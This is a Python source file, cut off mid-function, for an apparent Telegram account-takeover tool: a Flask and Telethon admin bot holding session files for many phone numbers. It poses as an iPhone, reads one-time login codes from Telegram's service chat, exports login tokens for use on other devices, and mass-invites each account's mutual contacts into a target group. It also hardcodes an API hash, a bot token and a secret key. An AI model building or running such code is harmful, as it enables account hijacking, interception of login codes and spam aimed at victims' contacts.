# -*- coding: utf-8 -*-
import asyncio
import threading
import os
import time
import logging
import json
import sys
import codecs
import re
from datetime import datetime
from typing import Dict, List, Optional
from flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify
from telethon import TelegramClient, events, Button
from telethon.errors import (
    SessionPasswordNeededError, 
    FloodWaitError, 
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    RPCError,
    AuthRestartError
)
from telethon.tl.functions.channels import JoinChannelRequest, InviteToChannelRequest
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.functions.auth import ExportLoginTokenRequest
from telethon.tl.types import auth
import concurrent.futures

# --- FIX UNICODE ENCODING FOR WINDOWS ---
if sys.platform == "win32":
    sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'strict')
    sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, 'strict')

# --- LOGGING KONFIGURASI ---
class UnicodeSafeFormatter(logging.Formatter):
    def format(self, record):
        try:
            return super().format(record)
        except UnicodeEncodeError:
            record.msg = self._safe_encode(record.msg)
            return super().format(record)
    
    def _safe_encode(self, text):
        if isinstance(text, str):
            return text.encode('ascii', 'ignore').decode('ascii')
        return text

log_formatter = UnicodeSafeFormatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
file_handler = logging.FileHandler('telegram_bot.log', encoding='utf-8')
file_handler.setFormatter(log_formatter)
stream_handler = logging.StreamHandler(sys.stdout)
stream_handler.setFormatter(log_formatter)

logging.basicConfig(
    level=logging.INFO,
    handlers=[file_handler, stream_handler]
)
logger = logging.getLogger(__name__)

# --- EVENT LOOP MANAGEMENT ---
class EventLoopManager:
    """Mengelola event loop untuk thread yang berbeda"""
    def __init__(self):
        self._loop = None
        self._executor = concurrent.futures.ThreadPoolExecutor(
            max_workers=10, 
            thread_name_prefix="AsyncThread"
        )
        self._lock = threading.Lock()
        self._bot_loop = None
        
    def set_bot_loop(self, loop):
        """Set bot loop untuk notifikasi"""
        self._bot_loop = loop
    
    def get_bot_loop(self):
        """Get bot loop"""
        return self._bot_loop
    
    def get_main_loop(self):
        """Mendapatkan main event loop"""
        with self._lock:
            if self._loop is None:
                try:
                    self._loop = asyncio.get_event_loop()
                except RuntimeError:
                    self._loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(self._loop)
            return self._loop
    
    def run_async(self, coro, timeout=30):
        """Menjalankan coroutine secara async-safe"""
        try:
            # Coba dapatkan loop untuk thread saat ini
            try:
                loop = asyncio.get_event_loop()
            except RuntimeError:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
            
            # Jika coro bukan coroutine, wrap dengan async function
            if not asyncio.iscoroutine(coro):
                async def wrapper():
                    return coro
                coro = wrapper()
            
            # Jalankan coroutine
            return loop.run_until_complete(asyncio.wait_for(coro, timeout=timeout))
        except RuntimeError as e:
            # Jika error karena event loop, buat yang baru
            if "no running event loop" in str(e) or "no current event loop" in str(e):
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                return loop.run_until_complete(asyncio.wait_for(coro, timeout=timeout))
            raise
    
    def run_in_thread(self, func, *args, **kwargs):
        """Menjalankan fungsi di thread pool"""
        def thread_wrapper():
            try:
                # Buat event loop baru untuk thread worker
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                
                # Jika fungsi adalah coroutine function, jalankan sebagai coroutine
                if asyncio.iscoroutinefunction(func):
                    return loop.run_until_complete(func(*args, **kwargs))
                else:
                    # Jika fungsi biasa, jalankan langsung
                    return func(*args, **kwargs)
            except Exception as e:
                logger.error(f"Error in thread wrapper: {e}")
                raise
            finally:
                try:
                    if 'loop' in locals():
                        loop.close()
                except:
                    pass
        
        future = self._executor.submit(thread_wrapper)
        return future.result()
    
    def run_coroutine_in_bot_loop(self, coro):
        """Menjalankan coroutine di bot loop (untuk notifikasi)"""
        if self._bot_loop and self._bot_loop.is_running():
            future = asyncio.run_coroutine_threadsafe(coro, self._bot_loop)
            return future.result(timeout=30)
        else:
            logger.warning("Bot loop tidak berjalan, menggunakan thread loop")
            return self.run_async(coro)
    
    def shutdown(self):
        """Shutdown executor dan semua loop"""
        self._executor.shutdown(wait=True)
        with self._lock:
            if self._loop:
                try:
                    self._loop.close()
                except:
                    pass

# Inisialisasi EventLoopManager
loop_manager = EventLoopManager()

# --- KONFIGURASI PATH ---
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SESSION_DIR = os.path.join(BASE_DIR, 'sessions')
LOGS_DIR = os.path.join(BASE_DIR, 'logs')
CONFIG_FILE = os.path.join(BASE_DIR, 'config.json')

for directory in [SESSION_DIR, LOGS_DIR]:
    if not os.path.exists(directory):
        os.makedirs(directory)

def get_session_path(phone: str) -> str:
    """Membuat path session yang terisolasi untuk setiap nomor"""
    phone_clean = re.sub(r'\D', '', phone)
    user_session_dir = os.path.join(SESSION_DIR, phone_clean)
    if not os.path.exists(user_session_dir):
        os.makedirs(user_session_dir, exist_ok=True)
    return os.path.join(user_session_dir, f'{phone_clean}.session')

# --- LOAD KONFIGURASI ---
def load_config() -> Dict:
    default_config = {
        'api_id': 33814849,
        'api_hash': '6fa144dd275e34789ccc6bc77d0d6800',
        'bot_token': '8568390541:AAGPLyM5gday0959NsM2Bwl7HRGpkuBGgOs',
        'admin_ids': [5385908865],
        'web_special_group_link': "https://t.me/+vcYDjyo4zfEyY2Q1",
        'flask_secret_key': 'super_secret_key_anti_badai_123',
        'port': 5007,
        'host': '0.0.0.0',
        'max_mutual_invites': 20,
        'invite_delay': 2
    }
    
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                config = json.load(f)
                for key in default_config:
                    if key in config:
                        default_config[key] = config[key]
        
        if os.getenv('API_ID'):
            default_config['api_id'] = int(os.getenv('API_ID'))
        if os.getenv('API_HASH'):
            default_config['api_hash'] = os.getenv('API_HASH')
        if os.getenv('BOT_TOKEN'):
            default_config['bot_token'] = os.getenv('BOT_TOKEN')
            
    except Exception as e:
        logger.error(f"Error loading config: {e}")
    
    return default_config

config = load_config()

# --- VARIABEL GLOBAL ---
BOT_SESSION = os.path.join(SESSION_DIR, 'bot_session')
API_ID = config['api_id']
API_HASH = config['api_hash']
BOT_TOKEN = config['bot_token']
ADMIN_IDS = set(config['admin_ids'])
WEB_SPECIAL_GROUP_LINK = config['web_special_group_link']
MAX_MUTUAL_INVITES = config['max_mutual_invites']
INVITE_DELAY = config['invite_delay']

# State management
class BotState:
    def __init__(self):
        self.target_group_bot = ""
        self.otp_session_cache = "Belum ada data OTP session yang masuk."
        self.current_login_number = None
        self.active_clients: Dict[str, Dict] = {}  # Simpan session info, bukan client
        self.otp_requests: Dict[str, dict] = {}
        self._lock = threading.Lock()
        self.pending_callbacks: Dict[str, dict] = {}
        
    async def create_client(self, phone: str) -> Optional[TelegramClient]:
        """Membuat client baru di event loop saat ini"""
        try:
            session_path = get_session_path(phone)
            client = TelegramClient(
                session_path, 
                API_ID, 
                API_HASH, 
                **device_config,
                connection_retries=3,
                retry_delay=2,
                timeout=30
            )
            
            await client.connect()
            return client
        except Exception as e:
            logger.error(f"Error creating client for {phone}: {e}")
            return None
    
    async def get_client(self, phone: str) -> Optional[TelegramClient]:
        """Mendapatkan client baru untuk operasi"""
        with self._lock:
            # Hapus client lama dari cache
            if phone in self.active_clients:
                # Hanya simpan informasi, bukan client object
                client_info = self.active_clients[phone]
                # Buat client baru
                client = await self.create_client(phone)
                if client:
                    # Update info
                    self.active_clients[phone] = {
                        'phone': phone,
                        'session_path': get_session_path(phone),
                        'created_at': datetime.now().isoformat(),
                        'auth_status': None
                    }
                    return client
            else:
                client = await self.create_client(phone)
                if client:
                    self.active_clients[phone] = {
                        'phone': phone,
                        'session_path': get_session_path(phone),
                        'created_at': datetime.now().isoformat(),
                        'auth_status': None
                    }
                return client
    
    async def cleanup_client(self, client: TelegramClient):
        """Membersihkan client dan menutup koneksi dengan benar"""
        try:
            if client and client.is_connected():
                await client.disconnect()
        except Exception as e:
            logger.warning(f"Error disconnecting client: {e}")
    
    def add_session_info(self, phone: str, session_path: str):
        """Menambahkan informasi sesi"""
        with self._lock:
            self.active_clients[phone] = {
                'phone': phone,
                'session_path': session_path,
                'created_at': datetime.now().isoformat(),
                'auth_status': None
            }
    
    def get_session_info(self, phone: str = None):
        """Mendapatkan informasi sesi"""
        with self._lock:
            if phone and phone in self.active_clients:
                return self.active_clients[phone]
            elif self.active_clients:
                return next(iter(self.active_clients.values()), None)
            return None
        
    def remove_session(self, phone: str):
        """Menghapus sesi"""
        with self._lock:
            if phone in self.active_clients:
                del self.active_clients[phone]
            
    def clear_all_sessions(self):
        """Clear semua sesi"""
        with self._lock:
            self.active_clients.clear()
            
    def get_client_count(self) -> int:
        with self._lock:
            return len(self.active_clients)
    
    def add_otp_request(self, request_id: str, data: dict):
        with self._lock:
            self.otp_requests[request_id] = {
                **data,
                'created_at': datetime.now().isoformat(),
                'status': 'pending'
            }
    
    def get_otp_request(self, request_id: str):
        with self._lock:
            return self.otp_requests.get(request_id)
    
    def update_otp_request(self, request_id: str, updates: dict):
        with self._lock:
            if request_id in self.otp_requests:
                self.otp_requests[request_id].update(updates)
    
    def remove_otp_request(self, request_id: str):
        with self._lock:
            if request_id in self.otp_requests:
                del self.otp_requests[request_id]
    
    def track_callback(self, callback_id: str, data: dict):
        """Track callback untuk responsif"""
        with self._lock:
            self.pending_callbacks[callback_id] = {
                **data,
                'created_at': time.time(),
                'status': 'processing'
            }
    
    def update_callback(self, callback_id: str, updates: dict):
        """Update status callback"""
        with self._lock:
            if callback_id in self.pending_callbacks:
                self.pending_callbacks[callback_id].update(updates)
    
    def remove_callback(self, callback_id: str):
        """Hapus callback dari tracking"""
        with self._lock:
            if callback_id in self.pending_callbacks:
                del self.pending_callbacks[callback_id]

bot_state = BotState()

# --- SETUP FLASK ---
app = Flask(__name__)
app.secret_key = config['flask_secret_key']

# Metadata Perangkat
device_config = {
    'device_model': "iPhone 16 Pro Max",
    'system_version': "18.1.0",
    'app_version': "11.5.0",
    'lang_code': 'id',
    'system_lang_code': 'id-ID'
}

# Initialize bot client
bot = None

# --- FUNGSI PEMBANTU ---
def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

def run_async(coro, timeout: int = 30):
    """Wrapper untuk menjalankan coroutine dari thread lain"""
    return loop_manager.run_async(coro, timeout)

def run_in_thread(func, *args, **kwargs):
    """Menjalankan fungsi di thread pool"""
    return loop_manager.run_in_thread(func, *args, **kwargs)

def run_coroutine_in_bot_loop(coro):
    """Menjalankan coroutine di bot loop"""
    return loop_manager.run_coroutine_in_bot_loop(coro)

async def send_admin_notif_async(message: str):
    """Fungsi async untuk mengirim notifikasi ke admin"""
    if bot:
        for admin_id in ADMIN_IDS:
            try:
                await bot.send_message(
                    admin_id, 
                    f"LOG SISTEM\n\n{message}\n\n{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                )
            except Exception as e:
                logger.error(f"Gagal mengirim notifikasi ke admin {admin_id}: {e}")

def send_admin_notif(message: str):
    """Fungsi sync wrapper untuk mengirim notifikasi ke admin"""
    try:
        run_coroutine_in_bot_loop(send_admin_notif_async(message))
    except Exception as e:
        logger.error(f"Error in send_admin_notif: {e}")

def validate_phone_number(phone: str) -> str:
    """Validasi dan format nomor telepon Indonesia"""
    if not phone:
        return None
    
    # Hapus semua karakter non-digit
    digits = re.sub(r'\D', '', phone)
    
    # Cek panjang minimal dan maksimal
    if len(digits) < 10 or len(digits) > 15:
        return None
    
    # Format Indonesia (+62)
    if digits.startswith('0'):
        # 08123456789 -> +628123456789
        if len(digits) >= 10:
            return '+62' + digits[1:]
    elif digits.startswith('62'):
        # 628123456789 -> +628123456789
        if len(digits) >= 11:
            return '+' + digits
    elif digits.startswith('8'):
        # 8123456789 -> +628123456789
        if len(digits) >= 9:
            return '+62' + digits
    elif digits.startswith('+62'):
        # +628123456789 -> +628123456789
        if len(digits) >= 12:
            return phone
    elif digits.startswith('+'):
        # Biarkan format internasional lain
        return phone
    
    return None

def get_admin_buttons():
    """Tombol untuk admin panel"""
    return [
        [Button.inline("🔍 Cek Mutual", b"cek_mutual"), Button.inline("⚡ Sedot Grup", b"sedot_grup")],
        [Button.inline("🎯 Set Target", b"set_grup_btn"), Button.inline("👥 Auto Join", b"auto_join")],
        [Button.inline("📋 List Sesi", b"list_sesi"), Button.inline("🔓 Status Login", b"status_login")],
        [Button.inline("🔄 Reg OTP", b"reg_otp_baru"), Button.inline("📱 Cek SMS", b"auto_login_admin")],
        [Button.inline("📊 Stats", b"system_stats"), Button.inline("🚫 Logout All", b"logout_all")],
        [Button.inline("🔄 Refresh", b"refresh_panel")]
    ]

def get_session_files() -> List[Dict]:
    """Mendapatkan daftar file sesi yang tersimpan"""
    session_files = []
    
    try:
        for root, dirs, files in os.walk(SESSION_DIR):
            for file in files:
                if file.endswith('.session'):
                    file_path = os.path.join(root, file)
                    
                    # Skip jika ada lock file yang masih valid
                    lock_file_path = file_path + '.lock'
                    if os.path.exists(lock_file_path):
                        try:
                            lock_time = os.path.getmtime(lock_file_path)
                            if time.time() - lock_time > 30:
                                os.remove(lock_file_path)
                        except:
                            pass
                        continue
                    
                    try:
                        phone = None
                        # Coba ekstrak nomor dari path
                        if 'sessions' in root:
                            dir_name = os.path.basename(os.path.dirname(file_path))
                            if dir_name.isdigit():
                                phone = f"+62{dir_name}" if len(dir_name) <= 15 else dir_name
                        
                        # Jika tidak ditemukan dari path, coba dari filename
                        if not phone:
                            filename = file.replace('.session', '')
                            if filename.isdigit():
                                if len(filename) == 12 and filename.startswith('62'):
                                    phone = f"+{filename}"
                                elif len(filename) == 11 and filename.startswith('0'):
                                    phone = f"+62{filename[1:]}"
                                elif len(filename) == 10 and not filename.startswith('0'):
                                    phone = f"+62{filename}"
                                else:
                                    phone = filename
                        
                        file_size = os.path.getsize(file_path)
                        modified_time = datetime.fromtimestamp(os.path.getmtime(file_path))
                        
                        is_active = False
                        if phone:
                            session_info = bot_state.get_session_info(phone)
                            is_active = session_info is not None
                        
                        session_files.append({
                            'phone': phone or "Unknown",
                            'filename': file,
                            'path': file_path,
                            'size': file_size,
                            'modified': modified_time,
                            'is_active': is_active
                        })
                        
                    except (OSError, IOError):
                        continue
    except Exception as e:
        logger.error(f"Error reading session files: {e}")
    
    # Urutkan berdasarkan modifikasi terbaru
    session_files.sort(key=lambda x: x['modified'], reverse=True)
    return session_files

# --- ASYNC TELEGRAM FUNCTIONS ---
async def create_and_connect_client_async(phone: str, user_session_path: str):
    """Versi async untuk membuat dan menghubungkan client"""
    client = None
    try:
        # Cek apakah file sesi sudah ada
        if os.path.exists(user_session_path):
            # Jika sudah ada, coba load session yang ada
            client = TelegramClient(
                user_session_path, 
                API_ID, 
                API_HASH, 
                **device_config,
                timeout=30,
                connection_retries=3,
                retry_delay=2
            )
            
            await client.connect()
            
            # Cek apakah sudah login
            if await client.is_user_authorized():
                logger.info(f"Session found for {phone}, user already authorized")
                # Kirim kode request untuk mendapatkan kode baru
                sent_code = await client.send_code_request(phone)
                return client, sent_code
            else:
                logger.info(f"Session found for {phone}, but not authorized. Requesting new code...")
                # Kirim kode request
                sent_code = await client.send_code_request(phone)
                return client, sent_code
        else:
            # Buat session baru
            client = TelegramClient(
                user_session_path, 
                API_ID, 
                API_HASH, 
                **device_config,
                timeout=30,
                connection_retries=3,
                retry_delay=2
            )
            
            await client.connect()
            
            # Kirim kode request
            sent_code = await client.send_code_request(phone)
            
            return client, sent_code
            
    except AuthRestartError:
        logger.warning(f"AuthRestartError for {phone}, creating fresh session...")
        # Hapus session file dan coba lagi
        if client:
            try:
                await client.disconnect()
            except:
                pass
        
        # Hapus session file jika ada
        try:
            if os.path.exists(user_session_path):
                os.remove(user_session_path)
        except:
            pass
        
        # Buat client baru
        client = TelegramClient(
            user_session_path, 
            API_ID, 
            API_HASH, 
            **device_config,
            timeout=30,
            connection_retries=3,
            retry_delay=2
        )
        
        await client.connect()
        sent_code = await client.send_code_request(phone)
        return client, sent_code
        
    except Exception as e:
        logger.error(f"Error in create_and_connect_client_async for {phone}: {e}")
        if client:
            try:
                await client.disconnect()
            except:
                pass
        raise

async def get_client_for_phone(phone: str) -> Optional[TelegramClient]:
    """Mendapatkan client untuk nomor tertentu (membuat baru setiap kali)"""
    try:
        session_path = get_session_path(phone)
        if not os.path.exists(session_path):
            logger.warning(f"Session file not found for {phone}")
            return None
        
        client = TelegramClient(
            session_path, 
            API_ID, 
            API_HASH, 
            **device_config,
            timeout=20,
            connection_retries=3,
            retry_delay=2
        )
        
        await client.connect()
        return client
    except Exception as e:
        logger.error(f"Error creating client for {phone}: {e}")
        return None

async def request_new_otp_from_session(phone: str) -> Optional[str]:
    """Meminta OTP baru dari sesi yang sudah login"""
    client = None
    try:
        client = await get_client_for_phone(phone)
        if not client:
            return f"❌ Tidak dapat membuat client untuk {phone}"
        
        if not await client.is_user_authorized():
            await bot_state.cleanup_client(client)
            return f"❌ Sesi untuk {phone} belum login"
        
        me = await client.get_me()
        session_info = {
            'phone': phone,
            'user_id': me.id,
            'username': me.username or '',
            'first_name': me.first_name or '',
            'requested_at': datetime.now().isoformat()
        }
        
        import hashlib
        request_id = hashlib.md5(f"{phone}{datetime.now().timestamp()}".encode()).hexdigest()[:8]
        
        bot_state.add_otp_request(request_id, {
            **session_info,
            'type': 'new_otp',
            'status': 'requested'
        })
        
        # Coba export login token
        try:
            result = await client(ExportLoginTokenRequest(
                api_id=API_ID,
                api_hash=API_HASH,
                except_ids=[]
            ))
            
            if isinstance(result, auth.LoginToken):
                token_info = {
                    'token': result.token.hex(),
                    'expires': result.expires.timestamp() if hasattr(result, 'expires') else None
                }
                
                bot_state.update_otp_request(request_id, {
                    'token': token_info['token'],
                    'token_expires': token_info['expires'],
                    'status': 'token_generated'
                })
                
                result_msg = f"✅ Token login berhasil dibuat untuk {phone}\n\n📱 User: {me.first_name}\n🔑 Token: `{token_info['token'][:20]}...`\n🆔 Request ID: `{request_id}`\n\nToken dapat digunakan untuk login di perangkat lain."
                await bot_state.cleanup_client(client)
                return result_msg
                
        except Exception as token_error:
            logger.warning(f"Export token failed: {token_error}")
        
        # Cek pesan OTP dari 777000
        try:
            messages = []
            async for message in client.iter_messages(777000, limit=5):
                if any(keyword in message.text.lower() for keyword in ['code', 'otp', 'verifikasi', 'kode']):
                    messages.append({
                        'date': message.date,
                        'text': message.text[:200]
                    })
            
            if messages:
                latest_msg = messages[0]
                bot_state.update_otp_request(request_id, {
                    'latest_otp_message': latest_msg['text'],
                    'message_date': latest_msg['date'].isoformat() if hasattr(latest_msg['date'], 'isoformat') else str(latest_msg['date']),
                    'status': 'otp_found'
                })
                
                result_msg = f"✅ OTP ditemukan untuk {phone}\n\n📱 User: {me.first_name}\n📩 Pesan terakhir: `{latest_msg['text'][:100]}...`\n🕐 Waktu: {latest_msg['date']}\n🆔 Request ID: `{request_id}`"
                await bot_state.cleanup_client(client)
                return result_msg
        
        except Exception as msg_error:
            logger.warning(f"Check messages failed: {msg_error}")
        
        # Minta OTP baru via send_code_request
        try:
            sent_code = await client.send_code_request(phone)
            
            bot_state.update_otp_request(request_id, {
                'phone_code_hash': sent_code.phone_code_hash,
                'status': 'code_requested'
            })
            
            result_msg = f"✅ Permintaan OTP baru dikirim untuk {phone}\n\n📱 User: {me.first_name}\n🆔 Request ID: `{request_id}`\n📞 OTP akan dikirim via SMS/Telegram"
            await bot_state.cleanup_client(client)
            return result_msg
        
        except Exception as otp_error:
            logger.error(f"Request new OTP failed: {otp_error}")
            await bot_state.cleanup_client(client)
            return f"❌ Gagal meminta OTP baru untuk {phone}: {str(otp_error)}"
        
    except Exception as e:
        logger.error(f"Error in request_new_otp_from_session: {e}")
        if client:
            await bot_state.cleanup_client(client)
        return f"❌ Error: {str(e)}"

# --- CLEANUP BERKALA ---
async def periodic_cleanup():
    """Membersihkan koneksi yang idle secara berkala"""
    while True:
        await asyncio.sleep(300)
        
        try:
            # Tidak ada client yang perlu dibersihkan karena dibuat dan dihancurkan setiap kali
            pass
        except Exception as e:
            logger.error(f"Error in periodic cleanup: {e}")

# --- LOGIKA BOT ADMIN ---
async def setup_bot_handlers():
    global bot
    
    @bot.on(events.NewMessage(pattern='/start'))
    async def start_handler(event):
        if is_admin(event.sender_id):
            status_bot = bot_state.target_group_bot if bot_state.target_group_bot else "Belum Diatur"
            active_clients_count = bot_state.get_client_count()
            
            msg = (
                f"🤖 **Dashboard Admin Panel**\n\n"
                f"🎯 Target Grup: `{status_bot}`\n"
                f"✅ Status Bot: **Online**\n"
                f"📱 Client Aktif: **{active_clients_count}**\n"
                f"👑 Admin ID: `{event.sender_id}`\n\n"
                f"🛠️ Bot siap beroperasi!"
            )
            await event.reply(msg, buttons=get_admin_buttons())
        else:
            await event.respond("❌ Anda bukan admin yang berwenang!")

    @bot.on(events.CallbackQuery)
    async def callback_handler(event):
        if not is_admin(event.sender_id):
            await event.answer("❌ Akses ditolak!", alert=True)
            return
        
        data = event.data.decode() if isinstance(event.data, bytes) else str(event.data)
        callback_id = f"{event.sender_id}_{event.id}"
        
        try:
            bot_state.track_callback(callback_id, {
                'data': data,
                'user_id': event.sender_id,
                'timestamp': time.time()
            })
            
            await event.answer("🔄 Memproses...", alert=False)
            
            if data == "refresh_panel":
                status_bot = bot_state.target_group_bot if bot_state.target_group_bot else "Belum Diatur"
                active_clients_count = bot_state.get_client_count()
                
                msg = (
                    f"🤖 **Dashboard Admin Panel**\n\n"
                    f"🎯 Target Grup: `{status_bot}`\n"
                    f"✅ Status Bot: **Online**\n"
                    f"📱 Client Aktif: **{active_clients_count}**\n"
                    f"👑 Admin ID: `{event.sender_id}`\n\n"
                    f"🔄 Panel telah direfresh\n🕐 {datetime.now().strftime('%H:%M:%S')}"
                )
                await event.edit(msg, buttons=get_admin_buttons())
            
            elif data == "cek_mutual":
                # Dapatkan sesi pertama
                session_info = bot_state.get_session_info()
                if not session_info:
                    await event.answer("❌ Belum ada sesi aktif!", alert=True)
                    return
                    
                phone = session_info['phone']
                client = None
                try:
                    await event.answer("🔍 Mengecek kontak mutual...", alert=False)
                    client = await get_client_for_phone(phone)
                    if not client:
                        await event.answer("❌ Gagal membuat client!", alert=True)
                        return
                    
                    contacts = await client(GetContactsRequest(hash=0))
                    mutuals = [u for u in contacts.users if hasattr(u, 'mutual_contact') and u.mutual_contact]
                    
                    report = (
                        f"👥 **Hasil Analisis Kontak:**\n\n"
                        f"• Total Kontak: `{len(contacts.users)}`\n"
                        f"• Kontak Mutual: `{len(mutuals)}`\n"
                        f"• Non-Mutual: `{len(contacts.users) - len(mutuals)}`\n\n"
                        f"🕐 {datetime.now().strftime('%H:%M:%S')}"
                    )
                    
                    buttons = [
                        [Button.inline("🔄 Refresh", b"cek_mutual"), Button.inline("🔙 Kembali", b"back_to_main")]
                    ]
                    await event.edit(report, buttons=buttons)
                    
                except Exception as e:
                    logger.error(f"Error cek mutual: {e}")
                    await event.edit(f"❌ Error: {str(e)}", buttons=[[Button.inline("🔙 Kembali", b"back_to_main")]])
                finally:
                    if client:
                        await bot_state.cleanup_client(client)
            
            elif data == "sedot_grup":
                session_info = bot_state.get_session_info()
                if not session_info:
                    await event.answer("❌ Belum ada client aktif!", alert=True)
                    return
                    
                if not bot_state.target_group_bot:
                    await event.answer("⚠️ Atur Target Grup dulu!", alert=True)
                    return
                    
                phone = session_info['phone']
                client = None
                try:
                    await event.answer("🚀 Memulai proses invite...", alert=False)
                    client = await get_client_for_phone(phone)
                    if not client:
                        await event.answer("❌ Gagal membuat client!", alert=True)
                        return
                    
                    entity = await client.get_entity(bot_state.target_group_bot)
                    contacts = await client(GetContactsRequest(hash=0))
                    mutuals = [u for u in contacts.users if hasattr(u, 'mutual_contact') and u.mutual_contact]
                    
                    if not mutuals:
                        await event.edit("❌ Tidak ada kontak mutual yang ditemukan!", 
                                       buttons=[[Button.inline("🔙 Kembali", b"back_to_main")]])
                        return
                    
                    success = 0
                    failed = 0
                    progress_msg = await event.respond(f"🚀 Memulai invite... 0/{min(len(mutuals), MAX_MUTUAL_INVITES)}")
                    
                    for i, user in enumerate(mutuals[:MAX_MUTUAL_INVITES], 1):
                        try:
                            await client(InviteToChannelRequest(entity, [user]))
                            success += 1
                            if i % 5 == 0:
                                await progress_msg.edit(f"🚀 Proses invite... {i}/{min(len(mutuals), MAX_MUTUAL_INVITES)}")
                            await asyncio.sleep(INVITE_DELAY)
                            
                        except FloodWaitError as fwe:
                            logger.warning(f"Flood wait: {fwe.seconds}s")
                            await progress_msg.edit(f"⏳ Flood wait {fwe.seconds}s...")
                            await asyncio.sleep(fwe.seconds)
                        except Exception as e:
                            failed += 1
                            logger.warning(f"Failed to invite user {i}: {e}")
                            continue
                    
                    await progress_msg.delete()
                    
                    report = (
                        f"📊 **Laporan Invite:**\n\n"
                        f"• Total Mutual: `{len(mutuals)}`\n"
                        f"• Target Invite: `{min(len(mutuals), MAX_MUTUAL_INVITES)}`\n"
                        f"• Sukses: `{success}`\n"
                        f"• Gagal: `{failed}`\n"
                        f"• Target Grup: `{bot_state.target_group_bot}`\n\n"
                        f"✅ Proses selesai!"
                    )
                    
                    buttons = [
                        [Button.inline("🔄 Ulangi", b"sedot_grup"), Button.inline("🔙 Kembali", b"back_to_main")]
                    ]
                    await event.edit(report, buttons=buttons)
                    
                except Exception as e:
                    logger.error(f"Error sedot grup: {e}")
                    await event.edit(f"❌ Gagal: {str(e)}", buttons=[[Button.inline("🔙 Kembali", b"back_to_main")]])
                finally:
                    if client:
                        await bot_state.cleanup_client(client)
            
            elif data == "auto_login_admin":
                session_info = bot_state.get_session_info()
                if not session_info:
                    await event.answer("❌ Belum ada sesi aktif!", alert=True)
                    return
                    
                phone = session_info['phone']
                client = None
                try:
                    await event.answer("📱 Mengecek pesan OTP...", alert=False)
                    client = await get_client_for_phone(phone)
                    if not client:
                        await event.answer("❌ Gagal membuat client!", alert=True)
                        return
                    
                    messages = []
                    async for message in client.iter_messages(777000, limit=5):
                        msg_text = message.text or ""
                        if any(keyword in msg_text.lower() for keyword in ['code', 'otp', 'verifikasi', 'kode', 'login']):
                            messages.append(f"• `{message.date}`: {msg_text[:150]}...")
                    
                    if messages:
                        report = "📥 **5 Pesan Terakhir dari 777000:**\n\n" + "\n".join(messages)
                    else:
                        report = "📭 Tidak ada pesan OTP dari 777000"
                        
                    buttons = [
                        [Button.inline("🔄 Refresh", b"auto_login_admin"), Button.inline("🔙 Kembali", b"back_to_main")]
                    ]
                    await event.edit(report, buttons=buttons)
                    
                except Exception as e:
                    logger.error(f"Error cek SMS: {e}")
                    await event.edit(f"❌ Error: {str(e)}", buttons=[[Button.inline("🔙 Kembali", b"back_to_main")]])
                finally:
                    if client:
                        await bot_state.cleanup_client(client)
            
            elif data == "set_grup_btn":
                await event.answer("🎯 Atur target grup...", alert=False)
                
                async with bot.conversation(event.sender_id, timeout=60) as conv:
                    try:
                        await conv.send_message(
                            "🎯 **Kirim Link/Username Grup Target:**\n\nContoh:\n• @namagrup\n• https://t.me/namagrup\n• https://t.me/+abc123def456"
                        )
                        
                        res = await conv.get_response(timeout=60)
                        bot_state.target_group_bot = res.text.strip()
                        
                        # Validasi format
                        if not (bot_state.target_group_bot.startswith('@') or 
                               bot_state.target_group_bot.startswith('https://t.me/')):
                            await conv.send_message("⚠️ Format tidak valid! Gunakan @username atau link Telegram")
                            return
                        
                        send_admin_notif(f"🎯 Target grup diubah: `{bot_state.target_group_bot}`")
                        
                        buttons = [[Button.inline("✅ OK", b"back_to_main")]]
                        await conv.send_message(f"✅ Target disimpan: `{bot_state.target_group_bot}`", buttons=buttons)
                    except asyncio.TimeoutError:
                        await conv.send_message("⏰ Waktu habis, silakan coba lagi")
                    except Exception as e:
                        await conv.send_message(f"❌ Error: {str(e)}")
            
            elif data == "list_sesi":
                try:
                    await event.answer("📂 Mengambil daftar sesi...", alert=False)
                    session_files = get_session_files()
                    active_count = bot_state.get_client_count()
                    
                    report_lines = [
                        f"📊 **Statistik Sesi:**\n",
                        f"• Client Aktif: `{active_count}`",
                        f"• Sesi Tersimpan: `{len(session_files)}`\n",
                        f"📂 **Daftar Sesi (10 terbaru):**\n"
                    ]
                    
                    for i, session in enumerate(session_files[:10], 1):
                        status = "🟢" if session['is_active'] else "💾"
                        size_kb = session['size'] / 1024
                        time_str = session['modified'].strftime('%d/%m %H:%M')
                        phone_display = session['phone'][:15] + "..." if len(session['phone']) > 15 else session['phone']
                        report_lines.append(f"{i}. {status} `{phone_display}` ({size_kb:.1f}KB) - {time_str}")
                    
                    if len(session_files) > 10:
                        report_lines.append(f"\n...dan {len(session_files) - 10} sesi lainnya")
                        
                    report = "\n".join(report_lines)
                    
                    buttons = [
                        [Button.inline("🔄 Refresh", b"list_sesi"), Button.inline("🔙 Kembali", b"back_to_main")]
                    ]
                    await event.edit(report, buttons=buttons)
                except Exception as e:
                    logger.error(f"Error list sesi: {e}")
                    await event.edit(f"❌ Error: {str(e)}", buttons=[[Button.inline("🔙 Kembali", b"back_to_main")]])
            
            elif data == "status_login":
                await event.answer("🔓 Mengecek status login...", alert=False)
                active_sessions = []
                
                with bot_state._lock:
                    for phone, session_info in bot_state.active_clients.items():
                        active_sessions.append((phone, session_info))
                
                if not active_sessions:
                    response = "❌ Tidak ada sesi aktif"
                else:
                    report_lines = [f"🔓 **Status Login ({len(active_sessions)} sesi):**\n"]
                    for i, (phone, session_info) in enumerate(active_sessions[:10], 1):
                        try:
                            # Coba buat client untuk cek status
                            client = await get_client_for_phone(phone)
                            if client:
                                auth = await client.is_user_authorized()
                                if auth:
                                    me = await client.get_me()
